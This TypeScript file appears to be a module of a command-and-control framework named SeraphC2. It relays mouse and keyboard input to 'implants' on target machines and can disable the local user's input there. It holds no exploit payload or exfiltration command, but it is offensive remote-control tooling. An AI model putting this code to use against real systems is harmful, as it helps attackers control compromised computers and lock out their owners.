/**
 * RemoteDesktopService - Manages remote desktop interaction operations on implants
 * Implements requirements 11.1, 11.2, 11.4 from the SeraphC2 specification
 */

import { EventEmitter } from 'events';
import { CommandManager } from '../engine/command-manager';
import { createErrorWithContext } from '../../types/errors';
import {
  MouseClickEvent,
  MouseMoveEvent,
  KeyboardEvent,
  RemoteDesktopConfig,
  RemoteDesktopStatus,
  CommandType,
  Command,
} from '../../types/entities';
import { Logger } from '../../utils/logger';

export interface RemoteDesktopInteractionResult {
  success: boolean;
  message: string;
  timestamp: Date;
}

export interface RemoteDesktopConfigResult {
  success: boolean;
  message: string;
  config?: RemoteDesktopConfig;
}

export class RemoteDesktopService extends EventEmitter {
  private commandManager: CommandManager;
  private logger: Logger;
  private activeDesktops: Map<string, RemoteDesktopStatus> = new Map();

  constructor(commandManager: CommandManager) {
    super();
    this.commandManager = commandManager;
    this.logger = Logger.getInstance();
  }

  /**
   * Send mouse click event to implant
   */
  async sendMouseClick(
    implantId: string,
    operatorId: string,
    mouseEvent: MouseClickEvent
  ): Promise<RemoteDesktopInteractionResult> {
    try {
      this.logger.info('Sending mouse click event', { implantId, operatorId, mouseEvent });

      // Validate mouse event
      this.validateMouseEvent(mouseEvent);

      const payload = JSON.stringify(mouseEvent);

      const command = await this.commandManager.executeCommand({
        implantId,
        operatorId,
        type: CommandType.REMOTE_DESKTOP_MOUSE_CLICK,
        payload,
        timeout: 5000,
      });

      const result = await this.waitForCommandCompletion(command.id, 10000);

      if (!result) {
        throw new Error('Mouse click command timed out');
      }

      const success = result.result?.exitCode === 0;
      const message = success
        ? result.result?.stdout || 'Mouse click executed successfully'
        : result.result?.stderr || 'Failed to execute mouse click';

      // Update desktop status
      this.updateDesktopStatus(implantId, {
        lastInputTime: new Date(),
        inputCount: (this.activeDesktops.get(implantId)?.inputCount || 0) + 1,
      });

      this.emit('mouseClick', {
        implantId,
        operatorId,
        mouseEvent,
        success,
      });

      return {
        success,
        message,
        timestamp: new Date(),
      };
    } catch (error) {
      const errorWithContext = createErrorWithContext(error, { implantId, operatorId, mouseEvent });
      this.logger.error('Failed to send mouse click', errorWithContext);
      throw error;
    }
  }

  /**
   * Send mouse move event to implant
   */
  async sendMouseMove(
    implantId: string,
    operatorId: string,
    mouseEvent: MouseMoveEvent
  ): Promise<RemoteDesktopInteractionResult> {
    try {
      this.logger.debug('Sending mouse move event', { implantId, operatorId, mouseEvent });

      // Validate mouse event
      this.validateMouseMoveEvent(mouseEvent);

      const payload = JSON.stringify(mouseEvent);

      const command = await this.commandManager.executeCommand({
        implantId,
        operatorId,
        type: CommandType.REMOTE_DESKTOP_MOUSE_MOVE,
        payload,
        timeout: 3000,
      });

      const result = await this.waitForCommandCompletion(command.id, 5000);

      if (!result) {
        throw new Error('Mouse move command timed out');
      }

      const success = result.result?.exitCode === 0;
      const message = success
        ? result.result?.stdout || 'Mouse move executed successfully'
        : result.result?.stderr || 'Failed to execute mouse move';

      // Update desktop status (don't count mouse moves as heavily as clicks)
      this.updateDesktopStatus(implantId, {
        lastInputTime: new Date(),
      });

      this.emit('mouseMove', {
        implantId,
        operatorId,
        mouseEvent,
        success,
      });

      return {
        success,
        message,
        timestamp: new Date(),
      };
    } catch (error) {
      const errorWithContext = createErrorWithContext(error, { implantId, operatorId, mouseEvent });
      this.logger.error('Failed to send mouse move', errorWithContext);
      throw error;
    }
  }

  /**
   * Send keyboard input event to implant
   */
  async sendKeyboardInput(
    implantId: string,
    operatorId: string,
    keyEvent: KeyboardEvent
  ): Promise<RemoteDesktopInteractionResult> {
    try {
      this.logger.info('Sending keyboard input event', { implantId, operatorId, keyEvent });

      // Validate keyboard event
      this.validateKeyboardEvent(keyEvent);

      const payload = JSON.stringify(keyEvent);

      const command = await this.commandManager.executeCommand({
        implantId,
        operatorId,
        type: CommandType.REMOTE_DESKTOP_KEY_INPUT,
        payload,
        timeout: 5000,
      });

      const result = await this.waitForCommandCompletion(command.id, 10000);

      if (!result) {
        throw new Error('Keyboard input command timed out');
      }

      const success = result.result?.exitCode === 0;
      const message = success
        ? result.result?.stdout || 'Keyboard input executed successfully'
        : result.result?.stderr || 'Failed to execute keyboard input';

      // Update desktop status
      this.updateDesktopStatus(implantId, {
        lastInputTime: new Date(),
        inputCount: (this.activeDesktops.get(implantId)?.inputCount || 0) + 1,
      });

      this.emit('keyboardInput', {
        implantId,
        operatorId,
        keyEvent,
        success,
      });

      return {
        success,
        message,
        timestamp: new Date(),
      };
    } catch (error) {
      const errorWithContext = createErrorWithContext(error, { implantId, operatorId, keyEvent });
      this.logger.error('Failed to send keyboard input', errorWithContext);
      throw error;
    }
  }

  /**
   * Disable local input on the target system
   */
  async disableLocalInput(
    implantId: string,
    operatorId: string
  ): Promise<RemoteDesktopInteractionResult> {
    try {
      this.logger.info('Disabling local input', { implantId, operatorId });

      const command = await this.commandManager.executeCommand({
        implantId,
        operatorId,
        type: CommandType.REMOTE_DESKTOP_DISABLE_INPUT,
        payload: '',
        timeout: 10000,
      });

      const result = await this.waitForCommandCompletion(command.id, 15000);

      if (!result) {
        throw new Error('Disable local input command timed out');
      }

      const success = result.result?.exitCode === 0;
      const message = success
        ? result.result?.stdout || 'Local input disabled successfully'
        : result.result?.stderr || 'Failed to disable local input';

      // Update desktop status
      this.updateDesktopStatus(implantId, {
        localInputDisabled: success,
      });

      this.emit('localInputDisabled', {
        implantId,
        operatorId,
        success,
      });

      return {
        success,
        message,
        timestamp: new Date(),
      };
    } catch (error) {
      const errorWithContext = createErrorWithContext(error, { implantId, operatorId });
      this.logger.error('Failed to disable local input', errorWithContext);
      throw error;
    }
  }

  /**
   * Enable local input on the target system
   */
  async enableLocalInput(
    implantId: string,
    operatorId: string
  ): Promise<RemoteDesktopInteractionResult> {
    try {
      this.logger.info('Enabling local input', { implantId, operatorId });

      const command = await this.commandManager.executeCommand({
        implantId,
        operatorId,
        type: CommandType.REMOTE_DESKTOP_ENABLE_INPUT,
        payload: '',
        timeout: 10000,
      });

      const result = await this.waitForCommandCompletion(command.id, 15000);

      if (!result) {
        throw new Error('Enable local input command timed out');
      }

      const success = result.result?.exitCode === 0;
      const message = success
        ? result.result?.stdout || 'Local input enabled successfully'
        : result.result?.stderr || 'Failed to enable local input';

      // Update desktop status
      this.updateDesktopStatus(implantId, {
        localInputDisabled: !success,
      });

      this.emit('localInputEnabled', {
        implantId,
        operatorId,
        success,
      });

      return {
        success,
        message,
        timestamp: new Date(),
      };
    } catch (error) {
      const errorWithContext = createErrorWithContext(error, { implantId, operatorId });
      this.logger.error('Failed to enable local input', errorWithContext);
      throw error;
    }
  }

  /**
   * Initialize remote desktop session
   */
  async initializeRemoteDesktop(
    implantId: string,
    operatorId: string,
    config: RemoteDesktopConfig
  ): Promise<RemoteDesktopConfigResult> {
    try {
      this.logger.info('Initializing remote desktop session', { implantId, operatorId, config });

      // Validate config
      this.validateRemoteDesktopConfig(config);

      // Set up desktop status
      const desktopStatus: RemoteDesktopStatus = {
        isActive: true,
        mouseInputEnabled: config.enableMouseInput,
        keyboardInputEnabled: config.enableKeyboardInput,
        localInputDisabled: false,
        config,
        inputCount: 0,
      };

      this.activeDesktops.set(implantId, desktopStatus);

      this.emit('remoteDesktopInitialized', {
        implantId,
        operatorId,
        config,
      });

      return {
        success: true,
        message: 'Remote desktop session initialized successfully',
        config,
      };
    } catch (error) {
      const errorWithContext = createErrorWithContext(error, { implantId, operatorId, config });
      this.logger.error('Failed to initialize remote desktop', errorWithContext);
      throw error;
    }
  }

  /**
   * Terminate remote desktop session
   */
  async terminateRemoteDesktop(
    implantId: string,
    operatorId: string
  ): Promise<RemoteDesktopInteractionResult> {
    try {
      this.logger.info('Terminating remote desktop session', { implantId, operatorId });

      // Re-enable local input if it was disabled
      const desktopStatus = this.activeDesktops.get(implantId);
      if (desktopStatus?.localInputDisabled) {
        await this.enableLocalInput(implantId, operatorId);
      }

      // Remove desktop status
      this.activeDesktops.delete(implantId);

      this.emit('remoteDesktopTerminated', {
        implantId,
        operatorId,
      });

      return {
        success: true,
        message: 'Remote desktop session terminated successfully',
        timestamp: new Date(),
      };
    } catch (error) {
      const errorWithContext = createErrorWithContext(error, { implantId, operatorId });
      this.logger.error('Failed to terminate remote desktop', errorWithContext);
      throw error;
    }
  }

  /**
   * Get remote desktop status
   */
  getRemoteDesktopStatus(implantId: string): RemoteDesktopStatus | null {
    return this.activeDesktops.get(implantId) || null;
  }

  /**
   * Get all active remote desktop sessions
   */
  getAllActiveDesktops(): Map<string, RemoteDesktopStatus> {
    return new Map(this.activeDesktops);
  }

  /**
   * Update desktop status
   */
  private updateDesktopStatus(implantId: string, updates: Partial<RemoteDesktopStatus>): void {
    const current = this.activeDesktops.get(implantId);
    if (current) {
      this.activeDesktops.set(implantId, { ...current, ...updates });
    }
  }

  /**
   * Wait for command completion with timeout
   */
  private async waitForCommandCompletion(
    commandId: string,
    timeout: number
  ): Promise<Command | null> {
    return new Promise(resolve => {
      const startTime = Date.now();

      const checkCommand = async () => {
        try {
          const command = await this.commandManager.getCommandStatus(commandId);

          if (
            command &&
            (command.status === 'completed' ||
              command.status === 'failed' ||
              command.status === 'timeout')
          ) {
            resolve(command);
            return;
          }

          if (Date.now() - startTime > timeout) {
            resolve(null);
            return;
          }

          setTimeout(checkCommand, 100); // Check more frequently for input commands
        } catch (error) {
          resolve(null);
        }
      };

      checkCommand();
    });
  }

  /**
   * Validate mouse click event
   */
  private validateMouseEvent(mouseEvent: MouseClickEvent): void {
    if (mouseEvent.x < 0 || mouseEvent.y < 0) {
      throw new Error('Mouse coordinates must be non-negative');
    }

    if (!['left', 'right', 'middle'].includes(mouseEvent.button)) {
      throw new Error('Invalid mouse button. Must be left, right, or middle');
    }

    if (!['down', 'up', 'click', 'double_click'].includes(mouseEvent.action)) {
      throw new Error('Invalid mouse action. Must be down, up, click, or double_click');
    }

    if (mouseEvent.monitorId !== undefined && mouseEvent.monitorId < 0) {
      throw new Error('Monitor ID must be non-negative');
    }
  }

  /**
   * Validate mouse move event
   */
  private validateMouseMoveEvent(mouseEvent: MouseMoveEvent): void {
    if (mouseEvent.x < 0 || mouseEvent.y < 0) {
      throw new Error('Mouse coordinates must be non-negative');
    }

    if (mouseEvent.monitorId !== undefined && mouseEvent.monitorId < 0) {
      throw new Error('Monitor ID must be non-negative');
    }
  }

  /**
   * Validate keyboard event
   */
  private validateKeyboardEvent(keyEvent: KeyboardEvent): void {
    if (!keyEvent.key || keyEvent.key.length === 0) {
      throw new Error('Key must be specified');
    }

    if (!['down', 'up', 'press'].includes(keyEvent.action)) {
      throw new Error('Invalid key action. Must be down, up, or press');
    }
  }

  /**
   * Validate remote desktop configuration
   */
  private validateRemoteDesktopConfig(config: RemoteDesktopConfig): void {
    if (config.mouseSensitivity < 0.1 || config.mouseSensitivity > 2.0) {
      throw new Error('Mouse sensitivity must be between 0.1 and 2.0');
    }
  }
}
